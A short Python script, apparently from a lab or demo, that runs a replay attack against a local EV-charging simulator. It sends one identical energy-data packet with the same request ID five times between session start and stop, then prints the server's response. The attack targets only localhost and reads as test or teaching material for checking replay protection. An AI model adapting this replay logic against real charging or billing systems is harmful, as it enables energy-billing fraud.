import requests
import time
import uuid

BASE_URL = "http://127.0.0.1:5000"
VEHICLE_ID = "EV001"

print("Launching Replay Attack...")

# ✅ register attack
requests.get(f"{BASE_URL}/attack/replay")

# start session
requests.post(f"{BASE_URL}/start", json={"vehicle_id": VEHICLE_ID})

# create ONE payload
payload = {
    "vehicle_id": VEHICLE_ID,
    "energy": 2,
    "request_id": str(uuid.uuid4()),
    "timestamp": time.time()
}

# replay same packet
for i in range(5):
    requests.post(f"{BASE_URL}/data", json=payload)
    print(f"Replayed packet {i}")
    time.sleep(0.7)  # thoda slow for realism

# stop session
response = requests.post(f"{BASE_URL}/stop", json={"vehicle_id": VEHICLE_ID})

try:
    print("Final Response:", response.json())
except:
    print("Final Response (raw):", response.text)

    